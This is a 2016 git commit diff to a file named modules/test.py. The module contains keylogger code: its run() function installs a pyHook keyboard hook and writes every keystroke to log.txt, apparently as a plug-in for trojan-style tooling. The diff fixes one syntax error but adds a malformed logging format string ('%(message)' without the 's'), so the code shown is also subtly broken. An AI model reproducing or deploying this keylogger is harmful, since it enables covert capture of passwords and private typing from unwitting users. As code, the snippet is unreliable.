4a1dc738851f3da6b22c886a8544f1d70e7b6c40
experiment2016 <sarpiericam@libero.it>
2016-05-30 17:24:06 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -3,10 +3,9 @@ import pyHook, pythoncom, sys, logging
 def run(**args):
   try:
      file_log='log.txt'
-     def OnKeyboardEvent(event):
-         logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s')
-         chr(event.Ascii)
-         logging.log(10,chr(event.Ascii))
+     def OnKeyboardEvent (event):
+         logging.basicConfig(filename=file_log, level=logging.DEBUG, format ='%(message)')
+         logging.log(10, chr(event.Ascii))
          return True
      hooks_manager = pyHook.HookManager()
      hooks_manager.KeyDown = OnKeyboardEvent
